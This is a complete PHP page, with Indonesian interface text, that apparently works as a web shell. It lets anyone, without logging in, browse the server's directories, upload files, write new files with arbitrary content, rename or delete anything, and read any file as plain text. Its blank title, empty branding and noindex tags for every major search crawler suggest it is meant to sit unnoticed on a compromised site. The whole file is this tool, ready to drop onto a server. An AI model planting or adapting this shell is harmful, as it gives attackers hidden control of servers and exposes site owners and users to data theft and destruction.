<?php
function x($string) {
    return htmlspecialchars($string, ENT_QUOTES, 'UTF-8');
}

function formatSize($bytes) {
    if ($bytes >= 1073741824) {
        return number_format($bytes / 1073741824, 2) . ' GB';
    } elseif ($bytes >= 1048576) {
        return number_format($bytes / 1048576, 2) . ' MB';
    } elseif ($bytes >= 1024) {
        return number_format($bytes / 1024, 2) . ' KB';
    } else {
        return $bytes . ' B';
    }
}

function getIcon($path) {
    return is_dir($path) ? '📁' : '📄';
}

$currentPath = isset($_GET['d']) ? $_GET['d'] : getcwd();
if (!is_dir($currentPath)) {
    $currentPath = getcwd();
}

if (isset($_POST['upload'])) {
    $targetFile = $currentPath . DIRECTORY_SEPARATOR . $_FILES['uploaded_file']['name'];
    if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $targetFile)) {
        echo "<script>alert('File berhasil diunggah!');</script>";
    } else {
        echo "<script>alert('Gagal mengunggah file!');</script>";
    }
}

if (isset($_POST['create_folder'])) {
    $folderName = $_POST['folder_name'];
    if ($folderName && mkdir($currentPath . DIRECTORY_SEPARATOR . $folderName)) {
        echo "<script>alert('Folder berhasil dibuat!');</script>";
    } else {
        echo "<script>alert('Gagal membuat folder!');</script>";
    }
}

if (isset($_POST['rename'])) {
    $oldPath = $_POST['rename_path'];
    $newName = $_POST['new_name'];
    $newPath = dirname($oldPath) . DIRECTORY_SEPARATOR . $newName;
    if (rename($oldPath, $newPath)) {
        echo "<script>alert('Nama berhasil diubah!');</script>";
    } else {
        echo "<script>alert('Gagal mengubah nama!');</script>";
    }
}

if (isset($_POST['delete_path'])) {
    $deletePath = $_POST['delete_path'];
    if (is_dir($deletePath)) {
        rmdir($deletePath);
    } else {
        unlink($deletePath);
    }
    echo "<script>alert('Berhasil dihapus!');</script>";
}

if (isset($_GET['view'])) {
    $viewPath = $_GET['view'];
    if (is_file($viewPath)) {
        header('Content-Type: text/plain');
        readfile($viewPath);
        exit;
    }
}

if (isset($_POST['create_file'])) {
    $newFileName = $_POST['new_file_name'];
    $newFileContent = $_POST['new_file_content'];
    $newFilePath = $currentPath . DIRECTORY_SEPARATOR . $newFileName;
    if (file_put_contents($newFilePath, $newFileContent)) {
        echo "<script>alert('File berhasil dibuat!');</script>";
    } else {
        echo "<script>alert('Gagal membuat file!');</script>";
    }
}

?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title></title>
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex, nofollow">
    <meta name="bingbot" content="noindex, nofollow">
    <meta name="slurp" content="noindex, nofollow">
    <meta name="yandex" content="noindex, nofollow">
    <meta name="duckduckbot" content="noindex, nofollow">
    <link rel="icon" type="image/png" sizes="16x16" href="">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <link href="https://fonts.cdnfonts.com/css/qanelas" rel="stylesheet">
    <style>
      body {
            background-color: #001f3f;
            color: #ffffff;
            font-family: 'Qanelas', sans-serif;
            /* font-style: italic; */
            font-weight: 500;
            margin: 0;
            padding: 0;
            overflow: hidden;
            position: relative;
        }

        .drop {
            position: absolute;
            background: linear-gradient(180deg, #ffcc00, #ffcc00);
            width: 1.5px;
            height: 20px;
            opacity: 0.6;
            transform: rotate(10deg);
            animation: fall linear infinite;
        }

        @keyframes fall {
            0% {
                transform: translateY(-100px) rotate(10deg);
                opacity: 0;
            }
            10% {
                opacity: 0.6;
            }
            100% {
                transform: translateY(100vh) rotate(10deg);
                opacity: 0;
            }
        }

        #container {
            background-color: black;
            padding: 20px;
            margin: 10px;
            border-radius: 10px;
            max-width: 100%;
            width: 100%;
            box-sizing: border-box;
        }
        h2 {
            font-size: 24px;
            color: #fff;
        }
        a {
            color:rgb(255, 255, 255);
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
        .actions button {
            background-color:rgb(255, 255, 255);
            border: none;
            color: #001f3f;
            padding: 5px 10px;
            margin-right: 5px;
            border-radius: 5px;
            cursor: pointer;
        }
        .actions button:hover {
            background-color: #3399ff;
        }
        #server-info {
            margin-top: 30px;
            background-color: #002b5c;
            padding: 15px;
            border-radius: 8px;
        }
        #server-info h3 {
            margin-top: 0;
            color: #ffcc00;
        }
        #server-info table {
            width: 100%;
            border-collapse: collapse;
        }
        #server-info th, #server-info td {
            border: 1px solid rgb(0, 0, 0);
            padding: 8px;
        }
        .table-wrapper {
            overflow-y: auto;
            max-height: 400px;
            border: 1px solid #444;
            margin-top: 10px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            table-layout: fixed;
        }
        th, td {
            padding: 10px;
            text-align: left;
            border-bottom: 1px solid #444;
            word-wrap: break-word;
        }
        th {
            background-color: rgb(235, 180, 0);
            padding: 10px;
            color: #000;
            position: sticky;
            top: 0;
            z-index: 10;
        }
        tr:nth-child(even) { background-color: #003366; }
        tr:nth-child(odd) { background-color: #000000; }

        @media (max-width: 768px) {
            #container {
                padding: 10px;
            }
            h2 {
                font-size: 18px;
            }
            table {
                font-size: 12px;
            }
        }

        #create-file-form {
            display: none;
        }
    </style>
    <script>
        function toggleCreateFileForm() {
            const createFileForm = document.getElementById('create-file-form');
            createFileForm.style.display = createFileForm.style.display === 'none' ? 'block' : 'none';
        }
    </script>
</head>
<body>
<script>
    function createRain() {
        const numberOfDrops = 150;
        for (let i = 0; i < numberOfDrops; i++) {
            const drop = document.createElement('div');
            drop.classList.add('drop');
            drop.style.left = `${Math.random() * 100}vw`;
            const height = Math.random() * 20 + 10; 
            drop.style.height = `${height}px`;
            const duration = Math.random() * 1 + 1.5; 
            const delay = Math.random() * 2; 
            drop.style.animationDuration = `${duration}s`;
            drop.style.animationDelay = `${delay}s`;
            document.body.appendChild(drop);
        }
    }
    createRain();
</script>
<style>
    .header {
        text-align: center;
        padding:  10px 10px 10px; 
        background-color: #001f3f;
    }

    .header img {
        max-width: 250px;
        height: auto;
        margin-top: 7px;
    }
</style>
<div class="header">
        <img src="" alt="">
</div>

<div id="container">
<h2 style="color: #ffcc00;">📂</h2>
    
<!-- Breadcrumb -->
<div>
    <?php
echo '<div class="breadcrumb">';
$breadcrumbs = explode(DIRECTORY_SEPARATOR, $currentPath);
$breadcrumbPath = '';
$lastIndex = count($breadcrumbs) - 1;

foreach ($breadcrumbs as $index => $dir) {
    $breadcrumbPath .= $dir . DIRECTORY_SEPARATOR;
    echo '<a href="?d=' . urlencode($breadcrumbPath) . '">
            <i class="fa fa-folder"></i>' . x($dir) . '
          </a>';
    if ($index !== $lastIndex) {
        echo '<i class="fa fa-angle-right"></i>';
    }
}
echo '</div>';
?>
</div>
    <style>
.breadcrumb a {
    color: white;
    text-decoration: none;
    margin-right: 5px;
}

.breadcrumb i {
    color: #ffcc00;
    margin-right: 4px;
}
</style>

</br>
<!-- File Upload Form -->
<form method="POST" enctype="multipart/form-data">
    <input type="file" name="uploaded_file" required>
    <button type="submit" name="upload"><i class="fas fa-upload"></i> Upload</button>
</form>

</br>
<!-- Folder Create Form -->
<form method="POST">
    <input type="text" name="folder_name" placeholder="Input Folder Name" required>
    <button type="submit" name="create_folder"><i class="fas fa-folder-plus"></i> Create Folder</button>
</form>
</br>
<button onclick="toggleCreateFileForm()"><i class="fas fa-file-alt"></i> Create File</button>

<form method="POST" id="create-file-form" style="display:none;">
    <input type="text" name="new_file_name" placeholder="Nama File.txt" required>
    <textarea name="new_file_content" rows="5" placeholder="Isi file..." required></textarea>
    <button type="submit" name="create_file"><i class="fas fa-plus"></i> Save File</button>
</form>
<!-- Table Wrapper with Scroll -->
    <div class="table-wrapper">
        <table>
            <tr style="font-size: 20px;">
                <th>Name</th>
                <th>Permission</th>
                <th>Size</th>
                <th>Action</th>
            </tr>
<?php
$files = scandir($currentPath);
foreach ($files as $file) {
    if ($file !== '.' && $file !== '..') {
        $fullPath = $currentPath . DIRECTORY_SEPARATOR . $file;
        $permissions = is_readable($fullPath) ? substr(sprintf('%o', @fileperms($fullPath)), -4) : 'N/A';
        $size = (is_file($fullPath) && is_readable($fullPath)) ? formatSize(@filesize($fullPath)) : 'Folder';
        $icon = getIcon($fullPath);

        echo "<tr>
                <td>$icon <a href='?d=" . urlencode($fullPath) . "'>" . x($file) . "</a></td>
                <td>$permissions</td>
                <td>$size</td>
                <td class='actions'>
                    <form method='POST' style='display:inline;'>
                        <input type='hidden' name='rename_path' value='" . x($fullPath) . "'>
                        <input type='text' name='new_name' placeholder='Nama Baru'>
                        <button type='submit' name='rename'><i class='fas fa-edit'></i></button>
                    </form>
                    <form method='POST' style='display:inline;'>
                        <input type='hidden' name='delete_path' value='" . x($fullPath) . "'>
                        <button type='submit'><i class='fas fa-trash-alt'></i></button>
                    </form>";
        if (is_file($fullPath) && is_readable($fullPath)) {
            echo "<a href='?view=" . urlencode($fullPath) . "'><button type='button'><i class='fas fa-eye'></i></button></a>";
        }
        echo "</td>
              </tr>";
    }
}
?>

        </table>
    </div>
</div>
<h4 style="color:#ffcc00; text-align: center; margin: 20px auto; width: 100%; max-width: 100%; font-size: 1rem;"></h4>
</body>
</html>
